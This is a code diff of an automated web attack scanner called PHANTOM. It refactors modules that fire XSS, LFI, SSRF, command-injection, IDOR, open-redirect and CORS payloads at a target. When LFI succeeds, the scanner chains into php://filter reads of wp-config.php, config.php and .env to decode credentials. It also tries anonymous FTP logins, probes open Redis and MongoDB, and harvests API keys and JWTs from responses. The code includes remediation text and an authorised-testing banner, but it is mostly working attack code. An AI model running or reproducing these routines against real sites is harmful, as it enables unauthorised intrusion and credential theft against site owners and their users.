+        for field in fields:
+            for payload in XSS_PAYLOADS[:8]:
+                data = fields.copy(); data[field] = payload
+                r = (job.req(form["action"], method="POST", data=data)
+                     if form["method"] == "POST" else job.req(form["action"], params=data))
+                if r and payload in r.text:
+                    job.add_vuln("Reflected XSS (Form)", form["action"],
+                                 param=field, payload=payload,
+                                 evidence="XSS payload reflected in form response")
                     return
-                time.sleep(REQUEST_DELAY)
 
-    # ── Module J: IDOR ────────────────────────────────────────────────────────
-    def test_idor(self, url: str) -> None:
-        parsed = urlparse(url)
-        params = dict(parse_qsl(parsed.query))
-        numeric_params = {k: v for k, v in params.items()
-                         if v.isdigit() and int(v) > 0}
-        for param, val in numeric_params.items():
-            original_id = int(val)
-            baseline    = self._req(url)
-            if not baseline:
-                continue
-            for test_id in [original_id + 1, original_id - 1, original_id + 100, 1]:
-                if test_id <= 0:
-                    continue
-                tp   = params.copy(); tp[param] = str(test_id)
-                resp = self._req(url, params=tp)
-                if not resp:
-                    continue
-                if (resp.status_code == 200 and
-                        len(resp.text) > 100 and
-                        abs(len(resp.text) - len(baseline.text)) > 50):
-                    self._vuln("IDOR", "HIGH", url,
-                               parameter=param,
-                               payload=f"{param}={test_id}",
-                               evidence=f"ID {test_id} returned different data (original={original_id})")
-                    return
-                time.sleep(REQUEST_DELAY)
-
-        # HTTP verb tampering
-        for test_url in [url]:
-            for method in ["PUT", "DELETE", "PATCH"]:
-                resp = self._req(test_url, method=method)
-                if resp and resp.status_code not in (404, 405, 501):
-                    self.ui.log(f"Verb tamper: {method} {test_url[:50]} → {resp.status_code}", "WARN")
-
-    # ── Module K: Open Redirect ────────────────────────────────────────────────
-    def test_open_redirect(self, url: str) -> None:
-        parsed = urlparse(url)
-        params = dict(parse_qsl(parsed.query))
-        redir_params = {k: v for k, v in params.items()
-                        if k.lower() in REDIRECT_PARAMS}
-        for param in redir_params:
-            for payload in REDIRECT_PAYLOADS:
-                tp   = params.copy(); tp[param] = payload
-                resp = self._req(url, params=tp, allow_redirects=False)
-                if not resp:
-                    continue
-                if resp.status_code in (301, 302, 303, 307, 308):
-                    loc = resp.headers.get("Location", "")
-                    if "evil-phantom-test.com" in loc or "google.com" in loc:
-                        self._vuln("Open Redirect", "MEDIUM", url,
-                                   parameter=param, payload=payload,
-                                   evidence=f"Redirects to: {loc}")
-                        return
-                time.sleep(REQUEST_DELAY)
-
-    # ── Module L: Clickjacking PoC ─────────────────────────────────────────────
-    def test_clickjacking(self) -> None:
-        resp = self._req(self.base_url)
-        if not resp:
-            return
-        hlc = {k.lower(): v for k, v in resp.headers.items()}
-        if "x-frame-options" not in hlc and "content-security-policy" not in hlc:
-            self._vuln("Clickjacking", "MEDIUM", self.base_url,
-                       evidence="No X-Frame-Options or CSP frame-ancestors header",
-                       chain_type="CLICKJACKING_CONFIRMED")
-            # Generate PoC HTML
-            poc_html = f"""<!DOCTYPE html>
-<html><head><title>Clickjacking PoC — PHANTOM</title></head>
-<body style="margin:0;padding:20px;font-family:sans-serif">
-<h2 style="color:red">⚠ Clickjacking PoC — Authorized Testing Only</h2>
-<p>Target <strong>{self.base_url}</strong> can be embedded in an iframe:</p>
-<iframe src="{self.base_url}" width="800" height="600"
-        style="border:2px solid red;opacity:0.5;"></iframe>
-<div style="position:absolute;top:200px;left:100px;z-index:999;
-            background:rgba(255,0,0,0.3);padding:10px;color:white;font-size:20px">
-  FAKE BUTTON — victim clicks here thinking it's the site above
-</div>
-</body></html>"""
-            poc_path = f"clickjacking_poc_{urlparse(self.base_url).netloc.replace('.', '_')}.html"
-            with open(poc_path, "w") as f:
-                f.write(poc_html)
-            self.ui.log(f"Clickjacking PoC saved: {poc_path}", "CHAIN")
-
-    # ── Secret scan on all responses ──────────────────────────────────────────
-    def scan_response_for_secrets(self, url: str) -> None:
-        resp = self._req(url)
-        if not resp:
-            return
-        for key_type, pattern in API_KEY_PATTERNS.items():
-            for m in re.finditer(pattern, resp.text):
-                found = m.group(0)[:80]
-                if any(found == s.get("value", "")[:80] for s in self.state.secrets):
-                    continue
-                with self.state._lock:
-                    self.state.secrets.append({"type": key_type, "value": found, "url": url})
-                self._vuln("API Key Exposed", "CRITICAL", url,
-                           evidence=f"{key_type} found in response: {found[:40]}...")
-
-
-# ══════════════════════════════════════════════════════════════════════════════
-#  CHAIN ENGINE
-# ══════════════════════════════════════════════════════════════════════════════
-
-class ChainEngine:
-    """Autonomous decision tree — chains follow-up actions based on findings."""
-
-    def __init__(self, vuln_engine: VulnEngine, crawler: WebCrawler,
-                 state: ScanState, ui: UIManager):
-        self.ve    = vuln_engine
-        self.craw  = crawler
-        self.state = state
-        self.ui    = ui
-
-    def decide_next_action(self, finding: Finding) -> None:
-        """Core decision tree — trigger follow-up modules based on finding type."""
-        ct = finding.chain_type
-        if ct == "EXPOSED_ENV":
-            self._handle_exposed_env(finding)
-        elif ct == "EXPOSED_GIT":
-            self._handle_exposed_git(finding)
-        elif ct == "SQLI_CONFIRMED":
-            self.ui.log("Chain: SQLi confirmed — extraction already done", "CHAIN")
-        elif ct == "LFI_CONFIRMED":
-            self._handle_lfi_confirmed(finding)
-        elif ct == "SSTI_CONFIRMED":
-            self.ui.log("Chain: SSTI confirmed — RCE vector flagged", "CHAIN")
-        elif ct == "CLICKJACKING_CONFIRMED":
-            self.ui.log("Chain: Clickjacking PoC generated", "CHAIN")
-        elif "OPEN_REDIS" in ct:
-            self.ui.log("Chain: Redis open — data access confirmed", "CHAIN")
-
-    def _handle_exposed_env(self, finding: Finding) -> None:
-        self.ui.log("Chain: .env exposed — scanning for secrets", "CHAIN")
-        extracted = finding.extracted
-        for k, v in extracted.items():
-            if any(kw in k.upper() for kw in ["PASSWORD", "SECRET", "KEY", "TOKEN"]):
-                self.ui.log(f"  Credential in .env: {k}={v[:20]}...", "VULN")
-                self.state.add_finding(Finding(
-                    vuln_id="", type="Credential Exposed",
-                    severity="CRITICAL", location=finding.location,
-                    evidence=f"{k}: {v[:30]}...",
-                    cvss=9.9, owasp="A02:2021", cwe="CWE-312",
-                    impact="Direct credential access to database/services",
-                    fix=["Revoke and rotate credential immediately",
-                         "Use vault/secrets manager", "Add .env to .gitignore"],
-                ))
-
-    def _handle_exposed_git(self, finding: Finding) -> None:
-        self.ui.log("Chain: .git/config exposed — checking for credential in URL", "CHAIN")
-        repo_url = finding.extracted.get("repo_url", "")
-        if repo_url and "@" in repo_url:
-            self.ui.log(f"  Git repo URL contains credentials: {repo_url[:50]}", "VULN")
-            self.state.add_finding(Finding(
-                vuln_id="", type="Git Credential Exposed",
-                severity="CRITICAL", location=finding.location,
-                evidence=f"Git remote URL with embedded credentials: {repo_url[:60]}",
-                cvss=9.8, owasp="A02:2021", cwe="CWE-312",
-                impact="Source code access + credential theft",
-                fix=["git remote set-url to remove credentials",
-                     "Use SSH keys or token-based auth for git remotes"],
-            ))
-
-    def _handle_lfi_confirmed(self, finding: Finding) -> None:
-        self.ui.log("Chain: LFI confirmed — checking PHP filter wrappers", "CHAIN")
-        # Attempt to read config files via php://filter (detection only)
-        target_url = finding.location
-        param      = finding.parameter
-        parsed     = urlparse(target_url)
-        params     = dict(parse_qsl(parsed.query))
-        for cfg_file in ["config.php", "wp-config.php", "settings.php", ".env"]:
-            payload = f"php://filter/convert.base64-encode/resource={cfg_file}"
+# Module C: LFI
+def _test_lfi(job: ScanJob, url: str) -> None:
+    params = dict(parse_qsl(urlparse(url).query))
+    fp = {k:v for k,v in params.items() if any(kw in k.lower() for kw in LFI_PARAMS)}
+    for param in fp:
+        for payload in LFI_PAYLOADS:
             tp = params.copy(); tp[param] = payload
-            resp = self.ve._req(target_url, params=tp)
-            if resp and len(resp.text) > 20:
-                try:
-                    decoded = base64.b64decode(
-                        re.search(r"[A-Za-z0-9+/=]{20,}", resp.text).group(0)
-                    ).decode("utf-8", errors="ignore")
-                    if any(kw in decoded.lower() for kw in
-                           ["password", "secret", "define(", "DB_"]):
-                        self.ui.log(f"  LFI→php://filter read {cfg_file}!", "VULN")
-                        self.state.add_finding(Finding(
-                            vuln_id="", type="LFI Config Read",
-                            severity="CRITICAL", location=target_url,
-                            parameter=param, payload=payload,
-                            evidence=f"php://filter read {cfg_file} — config exposed",
-                            extracted={"content_preview": decoded[:200]},
-                            cvss=9.0, owasp="A01:2021", cwe="CWE-22",
-                            impact="Config file source code exposed including credentials",
-                            fix=["Disable php://filter", "Fix LFI vulnerability first"],
-                        ))
-                except Exception:
-                    pass
+            r  = job.req(url, params=tp)
+            if r and any(ind in r.text for ind in LFI_INDICATORS):
+                excerpt = r.text[:150] if "root:x:" in r.text else ""
+                job.add_vuln("LFI", url, param=param, payload=payload,
+                             evidence="File inclusion confirmed",
+                             extracted={"excerpt": excerpt}, chain_type="LFI_CONFIRMED")
+                # Chain: try php://filter on config files
+                for cfg in ["config.php","wp-config.php",".env"]:
+                    tp2 = params.copy()
+                    tp2[param] = f"php://filter/convert.base64-encode/resource={cfg}"
+                    r2 = job.req(url, params=tp2)
+                    if r2 and len(r2.text) > 30:
+                        try:
+                            dec = base64.b64decode(
+                                re.search(r"[A-Za-z0-9+/=]{20,}", r2.text).group(0)
+                            ).decode("utf-8",errors="ignore")
+                            if any(kw in dec.lower() for kw in ["password","secret","define(","DB_"]):
+                                job.chain_event(f"php://filter read {cfg} — credentials found!")
+                                job.add_vuln("LFI Config Read", url, param=param,
+                                             payload=tp2[param],
+                                             evidence=f"Config file {cfg} decoded",
+                                             extracted={"preview": dec[:200]})
+                        except: pass
+                return
 
-    def run_service_chains(self, state: ScanState) -> None:
-        """Run chain attacks on open services discovered in port scan."""
-        host = urlparse(state.base_url).hostname
-        port_nums = [p["port"] for p in state.open_ports]
+# Module D: SSRF
+def _test_ssrf(job: ScanJob, url: str) -> None:
+    params = dict(parse_qsl(urlparse(url).query))
+    sp = {k:v for k,v in params.items() if k.lower() in SSRF_PARAMS}
+    for param in sp:
+        for ssrf_url in SSRF_PAYLOADS:
+            tp = params.copy(); tp[param] = ssrf_url
+            t0 = time.time()
+            r  = job.req(url, params=tp)
+            if not r: continue
+            if any(ind in r.text for ind in ["ami-id","instance-id","computeMetadata","iam/","root:x:"]):
+                job.add_vuln("SSRF", url, param=param, payload=ssrf_url,
+                             evidence=f"SSRF to {ssrf_url} returned cloud metadata!")
+                return
+            if time.time() - t0 > 3.5 and "169.254" in ssrf_url:
+                job.add_vuln("SSRF", url, param=param, payload=ssrf_url,
+                             evidence="Blind SSRF — response delayed 3.5s on metadata URL")
+                return
 
-        if 6379 in port_nums:
-            self._chain_redis(host, state)
-        if 9200 in port_nums or 9201 in port_nums:
-            self._chain_elasticsearch(host, state)
-        if 27017 in port_nums:
-            self._chain_mongodb(host, state)
-        if 21 in port_nums:
-            self._chain_ftp(host, state)
+# Module E: Sensitive files
+def _test_sensitive_files(job: ScanJob) -> None:
+    base = job.url
+    def probe(path):
+        r = job.req(base + path, allow_redirects=False)
+        if r and r.status_code in (200,401,403):
+            return path, r.status_code, r.text[:2000]
+        return None
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
+        futs = {ex.submit(probe, p): p for p in SENSITIVE_FILES + ADMIN_PATHS}
+        for fut in as_completed(futs):
+            res = fut.result()
+            if not res: continue
+            path, status, content = res
+            label = "EXPOSED" if status == 200 else "EXISTS(protected)"
+            job.log(f"[{status}] {label}: {path}", "VULN" if status == 200 else "WARN")
+            if status == 200:
+                ext = {}
+                if ".env" in path:
+                    keys = re.findall(r"([A-Z_]+=\S+)", content)
+                    if keys: ext["keys_found"] = keys[:3]
+                elif ".git/config" in path:
+                    m = re.search(r"url\s*=\s*(.+)", content)
+                    if m: ext["repo_url"] = m.group(1).strip()
+                elif "phpinfo" in path:
+                    m = re.search(r"PHP Version ([\d.]+)", content)
+                    if m: ext["php_version"] = m.group(1)
+                vtype = "Admin Panel Found" if path in ADMIN_PATHS else "Sensitive File Exposed"
+                job.add_vuln(vtype, base + path, evidence=f"HTTP 200 OK ({len(content)}B)", extracted=ext)
+                # Check for API keys in exposed file
+                for kt, pattern in API_KEY_PATTERNS.items():
+                    m = re.search(pattern, content)
+                    if m:
+                        job.add_vuln("API Key Exposed", base + path,
+                                     evidence=f"{kt}: {m.group(0)[:40]}...")
 
-    def _chain_redis(self, host: str, state: ScanState) -> None:
+# Module F: CORS
+def _test_cors(job: ScanJob) -> None:
+    for origin in ["https://evil-phantom-test.com","null",f"https://{job.host}.evil.com"]:
+        r = job.req(job.url, headers={"Origin": origin,
+                                       "User-Agent": USER_AGENTS[0]})
+        if not r: continue
+        acao = r.headers.get("Access-Control-Allow-Origin","")
+        acac = r.headers.get("Access-Control-Allow-Credentials","false")
+        if acao == origin:
+            sev = "CRITICAL" if acac.lower() == "true" else "HIGH"
+            job.add_vuln("CORS Misconfiguration", job.url,
+                         evidence=f"Origin '{origin}' reflected. ACAC={acac}",
+                         extracted={"severity_note": sev, "credentials": acac})
+        elif acao == "*":
+            job.log("CORS wildcard (*) — acceptable if no credentials", "WARN")
+
+# Module G: Security Headers
+def _test_headers(job: ScanJob) -> None:
+    r = job.req(job.url)
+    if not r: return
+    hlc = {k.lower(): v for k,v in r.headers.items()}
+    for hdr, info in SECURITY_HEADERS.items():
+        if hdr.lower() not in hlc:
+            risk = info["risk"]
+            job.add_vuln(f"Missing Header ({risk})", job.url,
+                         evidence=f"No {hdr} — {info['desc']}",
+                         extracted={"recommended": f"{hdr}: {info['rec']}"})
+        else:
+            val = hlc[hdr.lower()]
+            if hdr == "Content-Security-Policy" and ("unsafe-inline" in val or "unsafe-eval" in val):
+                job.log(f"Weak CSP: {val[:50]}", "WARN")
+    if "x-frame-options" not in hlc and "content-security-policy" not in hlc:
+        job.add_vuln("Clickjacking", job.url,
+                     evidence="No X-Frame-Options or CSP frame-ancestors header")
+    for lh in ["Server","X-Powered-By","X-AspNet-Version","X-Generator"]:
+        if lh.lower() in hlc:
+            job.add_vuln("Info Disclosure", job.url,
+                         evidence=f"{lh}: {hlc[lh.lower()]} — technology version exposed")
+
+# Module H: Cookies & Session
+def _test_cookies(job: ScanJob) -> None:
+    r = job.req(job.url)
+    if not r: return
+    for cookie in r.cookies:
+        flags = []
+        sc = r.headers.get("Set-Cookie","").lower()
+        if not cookie.secure: flags.append("No Secure flag")
+        if "httponly" not in sc: flags.append("No HttpOnly flag")
+        if "samesite" not in sc: flags.append("No SameSite flag")
+        if flags:
+            job.add_vuln("Insecure Cookie", job.url,
+                         param=cookie.name,
+                         evidence=f"Cookie '{cookie.name}': {', '.join(flags)}")
+    # JWT detection
+    jwt_re = r"eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.?[A-Za-z0-9\-_.+/=]*"
+    for m in re.finditer(jwt_re, r.text):
+        tok = m.group(0)
         try:
-            s = socket.socket(); s.settimeout(3); s.connect((host, 6379))
-            s.send(b"INFO server\r\n")
-            data = s.recv(2048).decode("utf-8", errors="ignore"); s.close()
-            if "redis_version" in data:
-                ver = (re.search(r"redis_version:(.+)", data) or type("", (), {"group": lambda *_: "?"})()).group(1) if re.search(r"redis_version:(.+)", data) else "?"
-                self.ui.log(f"Redis unauth access — v{str(ver).strip()}", "VULN")
-                state.add_finding(Finding(
-                    vuln_id="", type="Unauthenticated Redis",
-                    severity="CRITICAL", location=f"redis://{host}:6379",
-                    evidence=f"Redis INFO accessible — version {str(ver).strip()}",
-                    cvss=9.8, owasp="A05:2021", cwe="CWE-306",
-                    impact="Full read/write access to all cached data. "
-                           "Can be used for SSRF pivot or data poisoning.",
-                    fix=["Set Redis requirepass in redis.conf",
-                         "Bind Redis to 127.0.0.1 only",
-                         "Use network-level firewall rule"],
-                    chain_type="OPEN_REDIS",
-                ))
-        except Exception:
-            pass
+            h64 = tok.split(".")[0] + "=="
+            p64 = tok.split(".")[1] + "=="
+            hdr = json.loads(base64.urlsafe_b64decode(h64))
+            pld = json.loads(base64.urlsafe_b64decode(p64))
+            sensitive = [k for k in pld if k in ("password","pwd","secret","ssn","role","admin")]
+            job.add_vuln("JWT Issue", job.url,
+                         evidence=f"JWT found. alg={hdr.get('alg','?')} claims={list(pld.keys())[:5]}" +
+                                  (f" SENSITIVE_FIELDS: {sensitive}" if sensitive else ""),
+                         extracted={"algorithm": hdr.get("alg","?"), "sensitive_claims": sensitive})
+        except: pass
+    # CSRF
+    for form in job.forms:
+        if form["method"] == "POST":
+            has_csrf = any(any(kw in n.lower() for kw in ["csrf","token","_token","xsrf"])
+                          for n in form["inputs"])
+            if not has_csrf:
+                job.add_vuln("CSRF Missing Token", form["action"],
+                             evidence="POST form without CSRF protection token")
 
-    def _chain_elasticsearch(self, host: str, state: ScanState) -> None:
-        for port in [9200, 9201]:
-            try:
-                r = requests.get(f"http://{host}:{port}/_cat/indices?v",
-                                 timeout=5, verify=False)
-                if r.status_code == 200 and ("green" in r.text or "yellow" in r.text):
-                    self.ui.log(f"Elasticsearch open — indices listed on port {port}", "VULN")
-                    indices = re.findall(r"\b\w{3,40}\b", r.text)[:10]
-                    state.add_finding(Finding(
-                        vuln_id="", type="Unauthenticated Elasticsearch",
-                        severity="HIGH", location=f"http://{host}:{port}",
-                        evidence=f"Indices accessible: {', '.join(set(indices))[:80]}",
-                        cvss=7.5, owasp="A05:2021", cwe="CWE-306",
-                        impact="All Elasticsearch indices accessible — data breach risk",
-                        fix=["Enable Elasticsearch security (xpack.security.enabled: true)",
-                             "Set username/password for all cluster access",
-                             "Block port 9200 at firewall"],
-                    ))
+# Module I: Command Injection
+def _test_cmdi(job: ScanJob, url: str) -> None:
+    parsed = urlparse(url)
+    if not parsed.query: return
+    params = dict(parse_qsl(parsed.query))
+    for param in params:
+        # Time-based
+        t0 = time.time()
+        tp = params.copy(); tp[param] = "; sleep 3"
+        r  = job.req(url, params=tp)
+        if r and time.time() - t0 > 3.0:
+            job.add_vuln("Command Injection", url, param=param, payload="; sleep 3",
+                         evidence="Response delayed >3s — time-based CMDi confirmed")
+            return
+        # Output-based
+        for payload in CMD_PAYLOADS[:4]:
+            tp = params.copy(); tp[param] = payload
+            r  = job.req(url, params=tp)
+            if r and any(ind in r.text for ind in CMD_INDICATORS):
+                job.add_vuln("Command Injection", url, param=param, payload=payload,
+                             evidence="OS command output in response")
+                return
+
+# Module J: IDOR
+def _test_idor(job: ScanJob, url: str) -> None:
+    params = dict(parse_qsl(urlparse(url).query))
+    num_params = {k:v for k,v in params.items() if v.isdigit() and int(v) > 0}
+    base_r = job.req(url)
+    if not base_r: return
+    for param, val in num_params.items():
+        orig = int(val)
+        for test_id in [orig+1, orig-1, 1, 9999]:
+            if test_id <= 0: continue
+            tp = params.copy(); tp[param] = str(test_id)
+            r  = job.req(url, params=tp)
+            if r and r.status_code == 200 and abs(len(r.text)-len(base_r.text)) > 80:
+                job.add_vuln("IDOR", url, param=param, payload=f"{param}={test_id}",
+                             evidence=f"ID {test_id} returned different data (orig={orig})")
+                return
+
+# Module K: Open Redirect
+def _test_redirect(job: ScanJob, url: str) -> None:
+    params = dict(parse_qsl(urlparse(url).query))
+    rp = {k:v for k,v in params.items() if k.lower() in REDIRECT_PARAMS}
+    for param in rp:
+        for payload in REDIRECT_PAYLOADS:
+            tp = params.copy(); tp[param] = payload
+            r  = job.req(url, params=tp, allow_redirects=False)
+            if r and r.status_code in (301,302,303,307,308):
+                loc = r.headers.get("Location","")
+                if "evil-phantom-test.com" in loc:
+                    job.add_vuln("Open Redirect", url, param=param, payload=payload,
+                                 evidence=f"Redirects to: {loc}")
                     return
-            except Exception:
-                pass
 
-    def _chain_mongodb(self, host: str, state: ScanState) -> None:
-        try:
-            s = socket.socket(); s.settimeout(3); s.connect((host, 27017))
-            # isMaster wire protocol probe
-            probe = (b"\x41\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
-                     b"\xd4\x07\x00\x00\x00\x00\x00\x00admin.$cmd\x00"
-                     b"\x00\x00\x00\x00\x01\x00\x00\x00"
-                     b"\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00")
-            s.send(probe)
-            data = s.recv(512); s.close()
-            if len(data) > 20:
-                self.ui.log(f"MongoDB responding without auth on port 27017", "VULN")
-                state.add_finding(Finding(
-                    vuln_id="", type="Unauthenticated MongoDB",
-                    severity="HIGH", location=f"mongodb://{host}:27017",
-                    evidence="MongoDB wire protocol response without credentials",
-                    cvss=7.5, owasp="A05:2021", cwe="CWE-306",
-                    impact="Database collections accessible without authentication",
-                    fix=["Enable MongoDB authentication (--auth flag)",
-                         "Set security.authorization: enabled in mongod.conf",
-                         "Bind to 127.0.0.1 and use firewall rules"],
-                ))
-        except Exception:
-            pass
+# Response secret scan
+def _scan_secrets(job: ScanJob, url: str) -> None:
+    r = job.req(url)
+    if not r: return
+    for kt, pattern in API_KEY_PATTERNS.items():
+        m = re.search(pattern, r.text)
+        if m:
+            val = m.group(0)[:80]
+            if not any(val == s.get("value","")[:80] for s in job.secrets):
+                with job._lock:
+                    job.secrets.append({"type":kt,"value":val,"url":url})
+                job.add_vuln("API Key Exposed", url, evidence=f"{kt}: {val[:40]}...")
 
-    def _chain_ftp(self, host: str, state: ScanState) -> None:
-        try:
-            s = socket.socket(); s.settimeout(4); s.connect((host, 21))
-            banner = s.recv(256).decode("utf-8", errors="ignore")
-            s.send(b"USER anonymous\r\n"); time.sleep(0.4); s.recv(256)
-            s.send(b"PASS anon@phantom.test\r\n"); time.sleep(0.4)
-            resp = s.recv(256).decode("utf-8", errors="ignore"); s.close()
-            if "230" in resp:
-                self.ui.log("FTP anonymous login SUCCESS!", "VULN")
-                state.add_finding(Finding(
-                    vuln_id="", type="FTP Anonymous Login",
-                    severity="HIGH", location=f"ftp://{host}:21",
-                    evidence=f"Anonymous FTP login accepted. Banner: {banner[:60]}",
-                    cvss=7.5, owasp="A07:2021", cwe="CWE-287",
-                    impact="Unauthenticated file download/upload. "
-                           "May expose source code, backups, or config files.",
-                    fix=["Disable anonymous FTP access",
-                         "If FTP needed, enforce strong authentication",
-                         "Consider SFTP/SCP instead of FTP"],
-                ))
-        except Exception:
-            pass
+def phase_vulns(job: ScanJob) -> None:
+    all_urls = list(job.urls) or [job.url]
+    total    = len(all_urls) * 8 + 6
+    job.set_phase("Phase 3: Vulns", total)
+    job.log(f"Testing {len(all_urls)} URLs across 12 vuln modules...", "INFO")
+
+    def scan_url(url: str) -> None:
+        _test_sqli_url(job, url)
+        _test_xss_url(job, url)
+        _test_lfi(job, url)
+        _test_ssrf(job, url)
+        _test_cmdi(job, url)
+        _test_idor(job, url)
+        _test_redirect(job, url)
+        _scan_secrets(job, url)
+        job.advance("Phase 3: Vulns", 8)
+
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
+        for fut in as_completed([ex.submit(scan_url, u) for u in all_urls]):
+            try: fut.result()
+            except: pass
+
+    _test_sqli_forms(job)
+    _test_xss_forms(job)
+    _test_cors(job)
+    _test_headers(job)
+    _test_cookies(job)
+    _test_sensitive_files(job)
+    for _ in range(6): job.advance("Phase 3: Vulns")
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  REPORT GENERATOR
+#  MAIN SCAN RUNNER
 # ══════════════════════════════════════════════════════════════════════════════
-
-class ReportGenerator:
-    """Generates Rich terminal report and JSON output file."""
-
-    def __init__(self, state: ScanState, ui: UIManager):
-        self.state = state
-        self.ui    = ui
-        self.console = Console()
-
-    def _risk_score(self) -> int:
-        c = self.state.counts()
-        score = min(100, c["CRITICAL"] * 25 + c["HIGH"] * 12 + c["MEDIUM"] * 5 + c["LOW"] * 2)
-        return score
-
-    def _risk_label(self, score: int) -> str:
-        if score >= 70: return "[bold red]CRITICAL[/bold red]"
-        if score >= 50: return "[bold yellow]HIGH[/bold yellow]"
-        if score >= 25: return "[bold cyan]MEDIUM[/bold cyan]"
-        return "[bold green]LOW[/bold green]"
-
-    def generate_terminal_report(self) -> None:
-        """Print the full security report to terminal using Rich."""
-        duration = time.time() - self.state.start_time
-        mins     = int(duration // 60)
-        secs     = int(duration % 60)
-        counts   = self.state.counts()
-        score    = self._risk_score()
-
-        self.console.print()
-        self.console.print(Rule("[bold red]◈  PHANTOM SECURITY ASSESSMENT REPORT  ◈[/bold red]"))
-        self.console.print()
-
-        # Executive summary
-        summary = Table(title="[bold]Executive Summary[/bold]",
-                        box=box.DOUBLE_EDGE, border_style="cyan",
-                        show_header=True, header_style="bold cyan")
-        summary.add_column("Metric", style="cyan", width=20)
-        summary.add_column("Value",  style="white", ratio=1)
-        summary.add_row("Target",       self.state.target)
-        summary.add_row("Scan Time",    f"{mins}m {secs}s")
-        summary.add_row("URLs Tested",  str(len(self.state.discovered_urls)))
-        summary.add_row("Ports Scanned",str(len(TOP_1000_PORTS)))
-        summary.add_row("Open Ports",   str(len(self.state.open_ports)))
-        summary.add_row("Forms Found",  str(len(self.state.forms)))
-        summary.add_row("JS Files",     str(len(self.state.js_files)))
-        summary.add_row("Secrets Found",str(len(self.state.secrets)))
-        summary.add_row("Total Issues", str(sum(counts.values())))
-        summary.add_row("[bold red]CRITICAL[/bold red]",   str(counts["CRITICAL"]))
-        summary.add_row("[bold yellow]HIGH[/bold yellow]",  str(counts["HIGH"]))
-        summary.add_row("[bold cyan]MEDIUM[/bold cyan]",    str(counts["MEDIUM"]))
-        summary.add_row("[bold green]LOW[/bold green]",     str(counts["LOW"]))
-        summary.add_row("Risk Score",   f"{score}/100 — {self._risk_label(score)}")
-        self.console.print(summary)
-        self.console.print()
-
-        # Open ports table
-        if self.state.open_ports:
-            ports_t = Table(title="[bold]Open Ports[/bold]",
-                            box=box.SIMPLE_HEAVY, border_style="blue")
-            ports_t.add_column("Port",    style="cyan",   width=8)
-            ports_t.add_column("Service", style="white",  width=15)
-            ports_t.add_column("Version", style="yellow", ratio=1)
-            ports_t.add_column("CVEs",    style="red",    ratio=2)
-            for p in self.state.open_ports:
-                cve_str = "; ".join(p.get("cves", []))[:60] if p.get("cves") else "—"
-                ports_t.add_row(str(p["port"]), p.get("service","?"),
-                                p.get("version","")[:40] or "—",
-                                cve_str)
-            self.console.print(ports_t)
-            self.console.print()
-
-        # Findings table
-        if self.state.findings:
-            find_t = Table(title="[bold]Findings[/bold]",
-                           box=box.SIMPLE_HEAVY, border_style="red",
-                           show_lines=True)
-            find_t.add_column("#",        style="dim",        width=8)
-            find_t.add_column("Severity", style="bold",       width=10)
-            find_t.add_column("Type",     style="white",      ratio=2)
-            find_t.add_column("Location", style="cyan",       ratio=3)
-            find_t.add_column("CVSS",     style="yellow",     width=6)
-
-            sev_colors = UIManager.SEV_COLORS
-            for f in sorted(self.state.findings,
-                            key=lambda x: ["CRITICAL","HIGH","MEDIUM","LOW","INFO"].index(
-                                x.severity if x.severity in
-                                ["CRITICAL","HIGH","MEDIUM","LOW","INFO"] else "INFO")):
-                clr = sev_colors.get(f.severity, "white")
-                find_t.add_row(
-                    f.vuln_id, f"[{clr}]{f.severity}[/{clr}]",
-                    f.type, f.location[:60], str(f.cvss),
-                )
-            self.console.print(find_t)
-            self.console.print()
-
-        # Detail panels for critical/high
-        for f in self.state.findings:
-            if f.severity not in ("CRITICAL", "HIGH"):
-                continue
-            clr = UIManager.SEV_COLORS.get(f.severity, "white")
-            content = Text()
-            content.append(f"ID        : {f.vuln_id}\n", style="dim")
-            content.append(f"Type      : {f.type}\n",    style="bold white")
-            content.append(f"Location  : {f.location}\n",style="cyan")
-            if f.parameter:
-                content.append(f"Parameter : {f.parameter}\n", style="yellow")
-            if f.payload:
-                content.append(f"Payload   : ", style="dim")
-                content.append(f"{f.payload[:80]}\n", style="bold red")
-            if f.evidence:
-                content.append(f"Evidence  : {f.evidence[:120]}\n", style="white")
-            if f.extracted:
-                content.append(f"Extracted : {json.dumps(f.extracted)[:100]}\n", style="green")
-            content.append(f"\nCVSS      : {f.cvss}  |  {f.owasp}  |  {f.cwe}\n", style="dim")
-            content.append(f"\nBUSINESS IMPACT:\n{f.impact}\n", style="bold yellow")
-            if f.fix:
-                content.append("\nREMEDIATION:\n", style="bold green")
-                for i, step in enumerate(f.fix, 1):
-                    content.append(f"  {i}. {step}\n", style="green")
-            self.console.print(Panel(
-                content,
-                title=f"[{clr}][{f.severity}] {f.type}[/{clr}]",
-                border_style=f.severity.lower().replace("critical", "red")
-                              .replace("high", "yellow")
-                              .replace("medium", "cyan").replace("low", "green"),
-            ))
-
-    def generate_json_report(self) -> str:
-        """Save machine-readable JSON report and return the file path."""
-        duration = time.time() - self.state.start_time
-        counts   = self.state.counts()
-        target_safe = re.sub(r"[^\w]", "_", self.state.target)[:30]
-        fname    = f"phantom_report_{target_safe}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-
-        report = {
-            "scan_metadata": {
-                "target":          self.state.target,
-                "timestamp":       datetime.now().isoformat(),
-                "duration_seconds": round(duration, 1),
-                "scanner_version":  SCANNER_VERSION,
-                "waf_detected":    self.state.waf_detected,
-            },
-            "summary": {
-                "total_issues": sum(counts.values()),
-                "critical":     counts["CRITICAL"],
-                "high":         counts["HIGH"],
-                "medium":       counts["MEDIUM"],
-                "low":          counts["LOW"],
-                "risk_score":   self._risk_score(),
-                "urls_tested":  len(self.state.discovered_urls),
-                "ports_scanned":len(TOP_1000_PORTS),
-            },
-            "open_ports": self.state.open_ports,
-            "discovered_urls": list(self.state.discovered_urls)[:100],
-            "extracted_secrets": self.state.secrets,
-            "vulnerabilities": [
-                {
-                    "id":           f.vuln_id,
-                    "type":         f.type,
-                    "severity":     f.severity,
-                    "cvss_score":   f.cvss,
-                    "owasp":        f.owasp,
-                    "cwe":          f.cwe,
-                    "location":     f.location,
-                    "parameter":    f.parameter,
-                    "payload":      f.payload,
-                    "evidence":     f.evidence,
-                    "extracted_data": f.extracted,
-                    "business_impact": f.impact,
